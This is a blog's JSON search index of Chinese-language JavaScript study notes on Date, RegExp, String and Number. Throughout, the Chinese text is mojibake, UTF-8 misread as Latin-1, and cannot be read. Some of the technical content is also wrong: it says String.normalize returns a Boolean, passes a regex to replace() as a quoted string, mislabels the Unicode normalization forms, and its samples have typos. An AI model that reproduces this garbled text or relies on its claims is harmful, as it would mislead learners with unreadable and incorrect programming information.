17:38:48æ—¥æœŸå¯¹è±¡æ¯”è¾ƒå¤§å°ï¼šæ¯«ç§’æ•°let lastDay = new Date()let toDay = new Date()lastDay &lt; toDay  // è·ç¦»1970å¹´çš„æ¯«ç§’æ•°æ¯”è¾ƒ  æ—¶é—´å°è£… ç¬¬ä¸‰æ–¹åº“  www.momentjs.cm"
  },
  
  {
    "title": "2.6.åŸºæœ¬å¼•ç”¨ç±»å‹ï¼ˆRegExpï¼‰",
    "url": "/posts/2.6.%E5%9F%BA%E6%9C%AC%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B-RegExp/",
    "categories": "JavaScript, å¼•ç”¨ç±»å‹",
    "tags": "javascriptBase",
    "date": "2022-08-08 00:00:00 +0800",
    





    
    "snippet": "æ­£åˆ™è¡¨è¾¾å¼ RegExpâ€‹\tå£°æ˜å’Œå®šä¹‰ï¼š/pattern/flages æˆ– new RegExp(\"pattern\",\"tage\")      tage ï¼š          gï¼šå…¨å±€æ¨¡å¼ï¼ŒæŸ¥æ‰¾å…¨éƒ¨å†…å®¹      iï¼šä¸åŒºåˆ†å¤§å°å†™      mï¼šå¤šè¡Œæ¨¡å¼ï¼ŒæŸ¥æ‰¾åˆ°ç¬¬ä¸€è¡Œæ–‡æœ¬æœ«å°¾è¿˜ä¼šç»§ç»­      yï¼šç²˜é™„æ¨¡å¼ï¼ŒåªæŸ¥åˆ°ä»lastIndexå¼€å§‹ä¹‹åçš„å­—ç¬¦ä¸²      uï¼šUnicodeæ¨¡å¼    ...",
    "content": "æ­£åˆ™è¡¨è¾¾å¼ RegExpâ€‹\tå£°æ˜å’Œå®šä¹‰ï¼š/pattern/flages æˆ– new RegExp(\"pattern\",\"tage\")      tage ï¼š          gï¼šå…¨å±€æ¨¡å¼ï¼ŒæŸ¥æ‰¾å…¨éƒ¨å†…å®¹      iï¼šä¸åŒºåˆ†å¤§å°å†™      mï¼šå¤šè¡Œæ¨¡å¼ï¼ŒæŸ¥æ‰¾åˆ°ç¬¬ä¸€è¡Œæ–‡æœ¬æœ«å°¾è¿˜ä¼šç»§ç»­      yï¼šç²˜é™„æ¨¡å¼ï¼ŒåªæŸ¥åˆ°ä»lastIndexå¼€å§‹ä¹‹åçš„å­—ç¬¦ä¸²      uï¼šUnicodeæ¨¡å¼      sï¼šdotAll æ¨¡å¼ï¼Œè¡¨ç¤ºå…ƒå­—ç¬¦.åŒ¹é…ä»»ä½•å­—ç¬¦ã€‚/så‡ºç°ç©ºç™½å°±åŒ¹é…ï¼› /Séç©ºç™½å°±åŒ¹é…ï¼›[/s/S]æ¢è¡Œå®Œå…¨åŒ¹é…            å…ƒå­—ç¬¦è½¬ä¹‰    åœ¨RegExpæ„é€ å‡½æ•°ä¸­ï¼Œä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å…ƒå­—ç¬¦éœ€è¦äºŒæ¬¡è½¬ä¹‰        å®ä¾‹å±æ€§ï¼šæä¾›æ¨¡å¼çš„å„æ–¹é¢ä¿¡æ¯          globalï¼šBooleanï¼Œæ˜¯å¦è®¾ç½®äº†gæ ‡å¿—      ignoreCaseï¼šBooleanï¼Œæ˜¯å¦è®¾ç½®äº†iæ ‡å¿—      unicodeï¼šBooleanï¼Œæ˜¯å¦è®¾ç½®äº†uæ ‡å¿—      stickyï¼šBooleanï¼Œæ˜¯å¦è®¾ç½®äº†yæ ‡å¿—      lastIndexï¼šintï¼Œæºå­—ç¬¦ä¸²åœ¨ä¸‹æ¬¡æœç´¢çš„å¼€å§‹ä½ç½®ï¼Œå§‹ç»ˆä»0å¼€å§‹      multilineï¼šBooleanï¼Œæ˜¯å¦è®¾ç½®äº†mæ ‡å¿—      dotAllï¼šBooleanï¼Œæ˜¯å¦è¿™æ˜¯äº†sæ ‡å¿—      sourceï¼šæ­£åˆ™å®ä¾‹çš„patternï¼ˆå­—é¢é‡ï¼‰      flagsï¼šæ ‡è®°å­—ç¬¦ä¸²ï¼Œå§‹ç»ˆä»¥å­—é¢é‡è€Œéä¼ å…¥æ„é€ å‡½æ•°çš„å­—ç¬¦ä¸²å½¢åŠ¿è¿”å›ï¼ˆæ²¡æœ‰å‰åæ–œæ ï¼‰            å®ä¾‹æ–¹æ³•ï¼šexec() é…åˆæ•è·ç»„ï¼Œæ¥å—è¦æŸ¥æ‰¾çš„ç›®æ ‡å­—ç¬¦ä¸²                  å­˜åœ¨åŒ¹é…é¡¹ï¼Œè¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…ä¿¡æ¯çš„æ•°ç»„ï¼›                  è¿”å›å€¼æ˜¯Arrayå®ä¾‹ï¼Œä½†åŒ…å«ä¸¤ä¸ªé¢å¤–å±æ€§ï¼šindex  å’Œ input                          index è¡¨ç¤ºæ¨¡å¼åŒ¹é…çš„èµ·å§‹ä½ç½®ï¼› input æ˜¯æŸ¥æ‰¾åˆ°çš„å­—ç¬¦ä¸²                                Arrayå®ä¾‹ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ åŒ…å« åŒ¹é…æ•´ä¸ªæ¨¡å¼çš„å­—ç¬¦ä¸²ï¼Œå…¶ä»–å…ƒç´ åŒ…å« è¡¨è¾¾å¼ä¸­æ•è·ç»„åŒ¹é…çš„å­—ç¬¦ä¸²ï¼›å¦‚æœæ²¡æœ‰æ•è·ç»„ï¼Œå°±åªæœ‰ä¸€ä¸ªå…ƒç´                           æ•è·ç»„ pattern = /å¦ˆå¦ˆ(å’Œçˆ¸çˆ¸(å’Œå­©å­)?)?/gi  å’Œ â€˜å¦ˆå¦ˆå’Œçˆ¸çˆ¸å’Œå­©å­â€™ï¼Œå­˜åœ¨ä¸‰ä¸ªå…ƒç´                                   array[0] = å¦ˆå¦ˆå’Œçˆ¸çˆ¸å’Œå­©å­                  array[1] = å’Œçˆ¸çˆ¸å’Œå­©å­                  array[2] = å’Œå­©å­                                                                                ä¸å­˜åœ¨åŒ¹é…é¡¹ï¼Œè¿”å›null                    ä¸åŒçš„tageåœ¨exceä¸‹çš„è¡¨ç°                              æ²¡æœ‰è®¾ç½®å…¨å±€å˜é‡ï¼Œåªä¼šè¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹ï¼ŒlastIndexä¸å˜ï¼›            è®¾ç½®äº†å…¨å±€å˜é‡ï¼Œæ¯æ¬¡è°ƒç”¨execéƒ½åœ¨å­—ç¬¦ä¸²å‘å‰æœç´¢ä¸‹ä¸€ä¸ªåŒ¹é…é¡¹ï¼ŒlastIndexæ¯æ¬¡éƒ½ä¼šå˜åŒ–ï¼Œç›´è‡³æœ«å°¾                                è®¾ç½®ç²˜é™„æ¨¡å¼ï¼Œæ¯æ¬¡åªä¼šåœ¨lastIndexçš„ä½ç½®ä¸Šå¯»æ‰¾åŒ¹é…é¡¹ï¼›            æ‰¾ä¸åˆ°åŒ¹é…é¡¹ï¼Œexce() è¿”å› nullï¼ŒlastIndex = 0                                    å®ä¾‹æ–¹æ³•ï¼š test()åªåœ¨ä¹è¾“å…¥æ˜¯å¦æœ‰æ•ˆï¼Œè€Œä¸åœ¨ä¹å†…å®¹ä¸”æ— ä»€ä¹ˆæ— æ•ˆ        æ„é€ å‡½æ•°æ–¹æ³•ï¼ˆé™æ€å±æ€§ï¼‰ï¼šæå–exec()å’Œ test()æ‰§è¡Œçš„æ“ä½œç›¸å…³ä¿¡æ¯              $1 - $9 ï¼šå–å‡ºå­˜å‚¨çš„9ä¸ªæ•è·ç»„åŒ¹é…é¡¹        ä½¿ç”¨æ–¹æ³•ï¼š  const pattern = /hort/g;const text = 'this has been a short summer' RegExp.input;  // this has been a short summer = RegExp.&amp;_;RegExp.leftContext; // this has been a = RegExp[$`]; //`RegExp.rightContext; // summer = RegExp[$']RegExp.$1; //'and dad and baby'"
  },
  
  {
    "title": "2.4.åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆStringï¼‰",
    "url": "/posts/2.4.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-String/",
    "categories": "JavaScript, åŸºæœ¬ç±»å‹",
    "tags": "javascriptBase",
    "date": "2022-08-07 00:00:00 +0800",
    





    
    "snippet": "å­—ç¬¦ä¸² Stringå›ºæœ‰å±æ€§ï¼š lengthå±æ€§ï¼Œå–é•¿åº¦é‡å¤è¾“å‡ºï¼šrepeat(n)ï¼Œé‡å¤næ¬¡ï¼Œè¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ç å…ƒç»„æˆï¼ˆU+0000 ~ U+FFFFèŒƒå›´å†…çš„å­—ç¬¦ï¼‰åŸºæœ¬å¤šè¯­è¨€å¹³é¢ï¼ˆBMP) ï¼šç”±16ä½ç å…ƒï¼ˆcode unitï¼‰ç»„æˆä¸€ä¸ªå­—ç¬¦            å‡½æ•°      è¿”å›å€¼                  charAt( index )      æŒ‡å®š16ä½ç å…ƒçš„æŒ‡å®šä½ç½®ï¼Œè¿”å›...",
    "content": "å­—ç¬¦ä¸² Stringå›ºæœ‰å±æ€§ï¼š lengthå±æ€§ï¼Œå–é•¿åº¦é‡å¤è¾“å‡ºï¼šrepeat(n)ï¼Œé‡å¤næ¬¡ï¼Œè¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ç å…ƒç»„æˆï¼ˆU+0000 ~ U+FFFFèŒƒå›´å†…çš„å­—ç¬¦ï¼‰åŸºæœ¬å¤šè¯­è¨€å¹³é¢ï¼ˆBMP) ï¼šç”±16ä½ç å…ƒï¼ˆcode unitï¼‰ç»„æˆä¸€ä¸ªå­—ç¬¦            å‡½æ•°      è¿”å›å€¼                  charAt( index )      æŒ‡å®š16ä½ç å…ƒçš„æŒ‡å®šä½ç½®ï¼Œè¿”å›å…¶å¯¹åº”å­—ç¬¦              charCodeAt( index )      æŒ‡å®šä½ç½®çš„ç å…ƒå€¼              fromCharCode( ç å…ƒ1, ç å…ƒ2, â€¦)      æ ¹æ®æ•°å€¼å¯¹åº”å­—ç¬¦æ‹¼æ¥èµ·æ¥ï¼Œè¿”å›å­—ç¬¦ä¸²      ä»£ç å¯¹ = åŸºæœ¬å¤šè¯­è¨€å¹³é¢ + å¢è¡¥å¹³é¢ ï¼šéœ€è¦ç”±å¦å¤–16ä½ç å…ƒç»„æˆï¼Œ2Ã—16=32ä½ç»„æˆä¸€ä¸ªå­—ç¬¦            Â       Â       Â                   codePointAt( index )      æŒ‡å®š16ä½ç å…ƒçš„æŒ‡å®šä½ç½®ï¼Œè¯†åˆ«å®Œæ•´çš„ç ç‚¹      Â               codePointAt( index )      æŒ‡å®šä½ç½®çš„ç å…ƒå€¼      Â               fromCodePoint( ç å…ƒ1, ç å…ƒ2, â€¦)      æ ¹æ®æ•°å€¼å¯¹åº”å­—ç¬¦æ‹¼æ¥èµ·æ¥ï¼Œè¿”å›å­—ç¬¦ä¸²      Â       ç ç‚¹ï¼ˆcodePointï¼‰æ˜¯Unicodeä¸­ä¸€ä¸ªå­—ç¬¦çš„å®Œæ•´æ ‡è¯†ã€‚å¦‚æœä¼ å…¥çš„ç å…ƒç´¢å¼•ä¸æ˜¯ä»£ç†å¯¹çš„å¼€å§‹ï¼Œå°±ä¼šè¿”å›é”™è¯¯çš„ç ç‚¹ã€‚è¿™ç§é”™è¯¯åªæœ‰æ£€æŸ¥å•ä¸ªå­—ç¬¦æ—¶å‡ºç°ã€‚console.log([...'abcvâ‘ ']) // ['a', 'b', 'c', 'v', 'â‘ ']è¿­ä»£å­—ç¬¦ä¸²å¯ä»¥æ™ºèƒ½è¯†åˆ«ä»£ç å¯¹çš„ç ç‚¹ç¼–ç æ–¹å¼â€‹\tUnicodeæä¾›4ç§è§„èŒƒåŒ–å½¢å¼ï¼šNFD(Normalization From D) ã€NFC(Normalization From D)ã€NFKD(Normalization From KD)ã€NFKC(Normalization From KD)â€‹\tString.normalize(NFD) æ ¹æ®ä¼ å…¥çš„æ¨¡å¼ï¼Œè¿”å›Booleanå€¼ï¼Œåˆ¤æ–­æ˜¯å¦ä»¥è§„èŒƒåŒ–è½¬æ¢  toString()ï¼š nullã€undefinedä¸èƒ½ç”¨ï¼›å‚æ•°æ˜¯è½¬å‡ºæ•°å€¼çš„åŸºæ•°  String()ï¼šå¯ä»¥è½¬ä»»ä½•ç±»å‹          å¯ä»¥è½¬åŒ–çš„ï¼Œè°ƒç”¨toString()      nullï¼Œè¿”å›null      undefinedï¼Œè¿”å›undefined      æˆªå–            Â       å‚æ•°      æ­£æ•°      è´Ÿæ•°                  slice      (start, end)      [start, end)      [start, length+(-end)+1)              subString      (start, end)      [start, end)      å°†æ‰€æœ‰è´Ÿæ•°è§†ä¸º0ï¼Œè¾“å‡º[0,start] == [start,0]              subStr      (start, strNumber)      [start, length)      ç¬¬ä¸€ä¸ªè´Ÿå‚æ•°å½“ä½œlength+endï¼Œä¹‹åçš„æ‰€æœ‰è´Ÿå‚æ•°éƒ½è½¬ä¸º0start&gt;0, length&lt;=0, è¿”å›''      æ£€ç´¢  indexOf('') &amp; lastIndexOf('')ï¼šä»0å¼€å§‹ï¼Œä¸å­˜åœ¨è¿”å›-1  includes('', start)ï¼š è¿”å›true / falseï¼Œæ£€ç´¢æ•´ä¸ªå­—ç¬¦ä¸²  startsWith &amp; endWith ï¼šæ˜¯å¦åœ¨å­—ç¬¦ä¸²å¤´éƒ¨ / å°¾éƒ¨å‡ºç°          startï¼šç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºå¼€å§‹ä½ç½®      endï¼šç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºå­—ç¬¦ä¸²æœ«å°¾çš„ä½ç½®        .some() &amp; every() ï¼šçŸ­è·¯éå†            Â       Â       Â                   æŒ‡å®šå­—ç¬¦çš„ä½ç½®ï¼Œä¸å­˜åœ¨è¿”å›-1      indexOf(â€˜â€™)      lastIndex(â€˜â€™)              æ˜¯å¦åŒ…å«æŒ‡å®šå­—ç¬¦ï¼Œè¿”å›Boolean      includes(â€œcharâ€, startIndex)      Â               æŒ‡å®šå­—ç¬¦ä¸²æ˜¯å¦å‡ºç°åœ¨å¤´éƒ¨/å°¾éƒ¨      startsWith(â€˜helloâ€™)      endWith(â€˜helloâ€™)              éå†ï¼ŒçŸ­è·¯åˆ¤æ–­      .some(â€˜â€™=&gt;{}) å­˜åœ¨      .every(â€˜â€™=&gt;{}) ä»»æ„      æ›¿æ¢      arr.replace(searchvalue, newValue)                  searchvalue å¯ä»¥æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹Ÿå¯ä»¥æ˜¯å­—ç¬¦ä¸²                    newValue æ˜¯å­—ç¬¦ä¸²çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ å­—ç¬¦åºåˆ— ï¼Œä½¿ç”¨ä¹‹å‰åŒ¹é…çš„å†…å®¹ï¼š        let text = 'cat, bat, sat, fat';result = text.replace('/(.at)/g',\"word($1)\")result // 'word(cat), word(bat), word(sat), word(fat)' è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²                            newValue å¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ¥å—3ä¸ªå‚æ•°ï¼Œå¯ä»¥æœ‰å¤šä¸ªæ•è·ç»„matchï¼Œä½†æœ€åä¸¤ä¸ªå‚æ•°è¿˜æ˜¯ä¸æ•´ä¸ªåŒ¹é…æ¨¡å¼çš„å¼€å§‹ä½ç½®å’ŒåŸå§‹å­—ç¬¦ä¸²        str.replace(/[&lt;&gt;\"&amp;]/g,function(match, pos, originalText){    switch(match){        case \"&lt;\" : return '&amp;lt;';        case \"&gt;\" : return '&amp;gt;';        case \"&amp;\" : return '&amp;amp;';                }})                          str.reduce()          (function(...),0)ï¼š ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šäº†preçš„åˆå§‹å€¼ä¸å†æ˜¯word/arry[0],è€Œæ˜¯ç¬¬äºŒä¸ªå‚æ•°çš„å€¼      pre.replace(word,)ï¼šå¯¹ç›®æ ‡å­—ç¬¦ä¸²ä¸­çš„ä¸å…³é”®å­—åˆ—è¡¨ç›¸åŒçš„å­—æ®µè¿›è¡Œæ›¿æ¢æ“ä½œ      æ•°ç»„åŒï¼Œå¯åšå¼•ç”¨å¼•ç”¨å¯¹è±¡ç­‰Max/Minæ¯”è¾ƒ            match(regexp) ï¼š å‚æ•°ä¸è¿”å›ç±»å‹ç­‰åŒäºexec()ï¼Œè¿”å›æŸ¥æ‰¾ä½ç½®        trim()ï¼šä¸å½±å“åŸå­—ç¬¦ä¸²ï¼Œ åˆ é™¤å‰ã€åæ‰€æœ‰ç©ºæ ¼ç¬¦ï¼› trimLeft()&amp;trimRight() ä»å¼€å§‹/æœ«å°¾æ¸…ç†ç©ºæ ¼ç¬¦        padStart(targetLengh, padString) &amp; padEnd(targetLengh, padString) å¤åˆ¶å­—ç¬¦ä¸²          ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®æ ‡é•¿åº¦ï¼›ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šå¡«å……çš„å­—ç¬¦ï¼ˆé»˜è®¤ä¸ºâ€˜â€™ â€œç©ºæ ¼0ï¼‰      è¿­ä»£â€‹\tString åœ¨åŸå‹ä¸­æš´éœ²ä¸€ä¸ª@@interatoræ–¹æ³•ï¼Œè¡¨ç¤ºå¯ä»¥è¿­ä»£å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦let message = 'abc';let stringIterator = massage[Symbol.iterator]();stringIterator.next(); [value:'a',done: false]// ... æ¨¡æ¿å­—ç¬¦ä¸²ï¼ˆES6ï¼‰â€‹\tä½¿ç”¨åå¼•å·å®šä¹‰ â€‹\tå­—ç¬¦ä¸²è¿æ¥ï¼š 'str1' + 'str2'1. è§£æå˜é‡`${å­—ç¬¦ä¸²1}æˆç«‹ä¸${å­—ç¬¦ä¸²2}`2. å¯è°ƒç”¨å‡½æ•°ï¼šæ˜¾ç¤ºä»£ç æ‰§è¡Œçš„è¿”å›å€¼`www.${show()}`3. å¯æ‹¼æ¥&lt;&gt;`&lt;ul&gt; ... &lt;/ul&gt;`4. å¯åµŒå¥—æ¨¡æ¿å­—é¢é‡,å¯æ¢è¡Œã€æ’ç‰ˆå‹å¥½let html = `&lt;ul&gt;\t&lt;li&gt;${result.name}&lt;/li&gt;    &lt;li&gt;${result.age}&lt;/li&gt;    &lt;li&gt;${result.sex}&lt;/li&gt;&lt;/ul&gt;`"
  },
  
  {
    "title": "2.3.åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆNumberï¼‰",
    "url": "/posts/2.3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-Number/",
    "categories": "JavaScript, åŸºæœ¬ç±»å‹",
    "tags": "javascriptBase",
    "date": "2022-08-05 00:00:00 +0800",
    





    
    "snippet": "ç‰¹æ®Šæ•°å­—numberçš„æ•°å­—è¿›åˆ¶      äºŒè¿›åˆ¶ï¼š0b        å…«è¿›åˆ¶ï¼š0        åå…­è¿›åˆ¶ï¼š0x  numberçš„æœ€å¤§å€¼æœ€å°å€¼      æœ€å¤§å€¼ï¼š Number.MAX_VALUE        æœ€å°å€¼ï¼šNumber.MIN_VALUE  æ— ç©·å¤§ æ— ç©·å°  æ— ç©·å¤§ï¼šInfinity â€” å¤§äºæœ€å¤§å€¼  æ— ç©·å°ï¼š-Infinity â€” å°äºæœ€å°å€¼  NaNï¼Œä»£è¡¨éæ•°å€¼       ...",
    "content": "ç‰¹æ®Šæ•°å­—numberçš„æ•°å­—è¿›åˆ¶      äºŒè¿›åˆ¶ï¼š0b        å…«è¿›åˆ¶ï¼š0        åå…­è¿›åˆ¶ï¼š0x  numberçš„æœ€å¤§å€¼æœ€å°å€¼      æœ€å¤§å€¼ï¼š Number.MAX_VALUE        æœ€å°å€¼ï¼šNumber.MIN_VALUE  æ— ç©·å¤§ æ— ç©·å°  æ— ç©·å¤§ï¼šInfinity â€” å¤§äºæœ€å¤§å€¼  æ— ç©·å°ï¼š-Infinity â€” å°äºæœ€å°å€¼  NaNï¼Œä»£è¡¨éæ•°å€¼          æœ¬åº”è¯¥è¿”å›æ•°å€¼çš„æ“ä½œæ•°ï¼Œæœªè¿”å›æ“ä½œæ•°      NaN != NaN ä¸ç­‰äºä»»ä½•æ•°      åˆ¤æ–­      æ•°å­—çš„ç±»å‹ Number.isInteger()ï¼šæ˜¯å¦ä¸ºæ•´æ•°        æ˜¯å¦ä¸ºNaNï¼š          Number.isNaN();                  trueï¼šè¡¨ç¤ºéæ•°å­—ï¼Œä»»ä½•ä¸èƒ½è½¬ä¸ºæ•°å€¼çš„å€¼ï¼š NaNã€â€blueâ€œ          ä¸æ˜¯NaNï¼Œ false                    Object.is(,NaN)            åˆ¤æ–­æ˜¯å¦æ˜¯ å®‰å…¨æ•´æ•°ï¼š    â€‹\tåœ¨ Number.MIN_SAFE_INTEGER ï¼ˆ$-2^{53}+1$ï¼‰åˆ° Number.MAX_SAFE_INTEGER ï¼ˆ$2^{53}-1$ï¼‰ èŒƒå›´å†…äºŒè¿›åˆ¶å€¼å¯ä»¥è¡¨ç¤ºä¸€ä¸ªæ•´æ•°å€¼ã€‚è¶…å‡ºè¿™ä¸ªèŒƒå›´ï¼Œå³ä½¿å°è¯•ä¿å­˜ä¸ºæ•´æ•°ï¼Œä¹Ÿä¼šä¿å­˜æˆä¸€ä¸ªé”™è¯¯çš„å®Œå…¨ä¸åŒçš„æ•°å€¼ã€‚    â€‹\tåˆ¤æ–­æ˜¯å¦åœ¨å®‰å…¨èŒƒå›´å†…ï¼Œå¯ä»¥ä½¿ç”¨ Number.isSafeInteger()ï¼Œè¿”å› true    0.1 + 0.2 â‰  0.3 é—®é¢˜  è½¬åŒ–      parseInt() å’Œ parseFloat()ï¼Œä¸“é—¨ä¸ºå­—ç¬¦ä¸²è½¬æ•°å­—          å¿½ç•¥å­—ç¬¦ä¸²çš„ç©ºæ ¼ï¼Œç›´åˆ°æ‰¾åˆ°ç¬¬ä¸€ä¸ªéç©ºæ ¼å­—ç¬¦      ç©ºå­—ç¬¦ä¸²\"\"ï¼Œæ²¡æœ‰æ•°å­—å­—ç¬¦ä¸²ï¼ˆå¦‚'blue'ï¼‰ï¼Œ è½¬åŒ–ç»“æœä¸ºNaN      å¯å°†æ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²åˆ å»åè¾¹éå­—ç¬¦ä¸²çš„éƒ¨åˆ†ï¼Œä»…ä¿ç•™æ•°å­—      å¯¹äºIntï¼Œå°æ•°ç‚¹ä¸æ˜¯æœ‰æ•ˆæ•°å­—å­—ç¬¦      å¯¹äºFloatï¼Œç¬¬äºŒä¸ªå°æ•°ç‚¹ä¸æ˜¯æœ‰æ•ˆæ•°å­—å­—ç¬¦            Number()å¯ä»¥è½¬ä»»ä½•ç±»å‹ä¸ºæ•°å­—ï¼Œè¦æ±‚å­—ç¬¦ä¸²éœ€ä¸ºæ•°å­—å­—ç¬¦ä¸²                            Â           Â           Â                                       Boolean          true=1          false=0                          Number          NumberåŸå€¼          Â                           null          0          Â                           undefined          NaN          Â                           String          ç©ºå­—ç¬¦ä¸²          0                          Â           åªåŒ…å«æ•°å€¼          åè¿›åˆ¶æ•°                          Â           åŒ…å«æœ‰æ•ˆæµ®ç‚¹æ•°          å¿½ç•¥å‰ç½®0ï¼Œè½¬ä¸ºæµ®ç‚¹æ•°                          Â           åŒ…å«Oxçš„æ•°å€¼          åå…­è¿›åˆ¶æ•°                          Â           åŒ…å«Oxçš„æ•°å€¼          äºŒè¿›åˆ¶æ•°                          Â           é™¤æ­¤ä¹‹å¤–          NaN                          Object          :one: ValueOf() è½¬          è‹¥ä¸ºNaN                          Â           :two: toString() è½¬          Â                           toString æ¥å—ä¸€ä¸ªè¡¨ç¤ºåŸºæ•°çš„å‚æ•°ï¼Œè¿”å›ç›¸åº”åŸºæ•°å½¢å¼çš„æ•°å€¼å­—ç¬¦ä¸²        toFixed() toExponential() toPrecision() è°ƒæ•´å°æ•°ä½ç²¾ç¡®è¡¨ç¤ºæ•°å€¼ï¼š          toFixed()ï¼š æŒ‡å®šå°æ•°ç‚¹ä½ï¼Œä¸è¶³ç”¨0å¡«å……ï¼›è¶…è¿‡ä½æ•°ï¼Œå››èˆäº”å…¥ã€‚      toExponential()ï¼šç§‘å­¦è®¡æ•°æ³•ï¼ŒæŒ‡å®šå°æ•°çš„ä½æ•°ã€‚99.toExponential(1) = 1e+2      toPrecision()ï¼šæ ¹æ®æ•°å€¼å’Œç²¾åº¦å†³å®šè°ƒç”¨toFixed()è¿˜æ˜¯ toExponential()      Numberå¯¹è±¡ &amp;Numberå€¼â€‹\tå­˜åœ¨ç€å’Œ Boolean åŒæ ·çš„é—®é¢˜ã€‚0.1+0.2 â‰  0.3â€‹\tåŸå› ï¼š é‡‡å– IEEE-754 64ä½åŒç²¾åº¦ æµ®ç‚¹æ•°å­˜å‚¨ï¼Œ Javascriptã€ Java ã€pythonç­‰è¯­è¨€éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜â€‹\tä¸€ä¸ªæµ®ç‚¹æ•°å 64ä¸ªbitï¼Œç”±ç¬¦å·ä½ï¼ˆ0ä¸ºæ­£ï¼Œ1ä¸ºè´Ÿï¼‰ã€æŒ‡æ•°éƒ¨åˆ†ï¼ˆç¡®å®šå°æ•°ç‚¹åœ¨ç¬¬å‡ ä½ï¼‰ã€æ•°å€¼éƒ¨åˆ†      æŒ‡æ•°éƒ¨åˆ†ï¼Œä½¿ç”¨ ç§»ç è¡¨ç¤ºæ³•          11bit æŒ‡æ•°ä»£è¡¨çš„å¤§å° $e=2^0+2^1+\\cdots+2^{11}$ï¼Œç¬¬ä¸€ä½ $2^0$ ä¸ºéšè—ä½ï¼Œä¸€å®šä¸º1ï¼ˆè§„èŒƒæ•°ï¼‰      å°æ•°ä½ç½® $p = e -1023$ ï¼ˆ1023 = æŒ‡æ•°éƒ¨åˆ† bit éƒ½ä¸º 1ï¼‰              $p=1075-1023=52$æ—¶ï¼Œ æ‰€æœ‰æ•°å€¼éƒ¨åˆ†éƒ½è¢«ç”¨æ¥è¡¨ç¤ºæ•´æ•°ï¼›52bit å…¨ä¸º1æ—¶ï¼Œæ˜¯èƒ½å¤Ÿè¡¨ç¤ºçš„æœ€å¤§æ•°å€¼ 9007199254740991                  $max +1 = 9007199254740992$ : å°æ•°ç‚¹å‘å³ç§»åŠ¨ä¸€ä½ p=53ï¼Œéšè—ä½ï¼ˆç¬¬12bitï¼‰=1ï¼Œæ•´æ•°éƒ¨åˆ†ï¼ˆ53bitï¼‰ä¸º0 â€”â€” ç¬¬53bit ä¸å­˜åœ¨åªèƒ½ä¸º0                          $9007199254740992+1$ ï¼šç¬¬53bit æ— æ³•ä¿®æ”¹ä¸º1ï¼Œæ— æ³•åŠ 2              $9007199254740992+2$ ï¼šç¬¬52bit = 1ï¼Œ 53bit = 0ï¼ˆæ— æ³•æ”¹å˜ï¼‰              $9007199254740992+3$ ï¼šç¬¬53bit æ— æ³•ä¿®æ”¹ä¸º1ï¼Œæ— æ³•åŠ 4              â€¦â€¦ ä»¥2ä¸ºé—´éš”ç›¸åŠ                                 å°æ•°ç‚¹ä½ä¸º53ï¼Œç¬¬45bit &amp; ç¬¬54bit = 0 æ— æ³•æ”¹å˜ï¼Œåªèƒ½ä»¥4ä¸ºé—´éš”ç›¸åŠ           ä¹‹åçš„æ•°å€¼éƒ½æ— æ³•å®Œæ•´è¡¨ç¤ºï¼Œä»»ä½•è®¡ç®—éƒ½ä¼šå‡ºé”™                            å°æ•°ç‚¹ä½è¶Šè¿‡éšè—ä½ï¼ˆç¬¬11bitï¼‰ï¼Œæ‰€æœ‰æ•°å€¼éƒ¨åˆ†éƒ½è¢«ç”¨æ¥è¡¨ç¤ºå°æ•°ï¼›                  éšè—ä½å›ºå®šå€¼ä¸º1æ—¶ï¼ˆè§„èŒƒæ•°ï¼‰ï¼Œè¡¨ç¤ºçš„æ•°ä¸€ç›´éƒ½æ˜¯ $2^{-1}$ å¹‚æ¬¡ï¼Œå€¼å¯èƒ½éå¸¸å°ï¼Œä½†ä¸€ç›´æœ‰å€¼                    æŒ‡æ•°éƒ¨åˆ†çš„æç«¯æƒ…å†µï¼š                  ç¬¦å·ä½1ã€0  + æŒ‡æ•°éƒ¨åˆ†éƒ½ä¸º`0` + éšè—ä½ä¸º0 + æ•°æ®éƒ¨åˆ†éƒ½ä¸º0 = Â±0 â€”â€” éè§„èŒƒæ•°          ç¬¦å·ä½1ã€0  + æŒ‡æ•°éƒ¨åˆ†éƒ½ä¸º`1`  + + æ•°æ®éƒ¨åˆ†éƒ½ä¸º0 = Â±infinity          ç¬¦å·ä½1ã€0  + æŒ‡æ•°éƒ¨åˆ†éƒ½ä¸º`1`  + + æ•°æ®éƒ¨åˆ†å­˜åœ¨1 = NaNï¼ˆtypeof NaN = â€numberâ€œï¼Œå­˜åœ¨1çš„å…³ç³» å¯ä»¥æœ‰å¤šç§NaNï¼‰                          æ•°å­—éƒ¨åˆ†ï¼šå°æ•°ä½ç½®å°†æ•°å€¼éƒ¨åˆ†åˆ†ä¸º æ•´æ•°å’Œå°æ•°          å°æ•°å€¼ $x = 2^{-1} + 2^{-2} + \\cdots + 2^{-n}$`                  å¹¶éæ‰€æœ‰å°æ•°éƒ½æ˜¯å¯ä»¥ä¸º $ 2^{-n}$ ç›´æ¥è¡¨ç¤º          å¦‚ $0.1 \\approx 2^{-4} + 2^{-5} + 2^{-5} + \\cdots + 2^{-47}$ï¼Œ 51bit åªå¾—åˆ°ä¸€ä¸ªæ— é™è¿‘ä¼¼äº 0.1 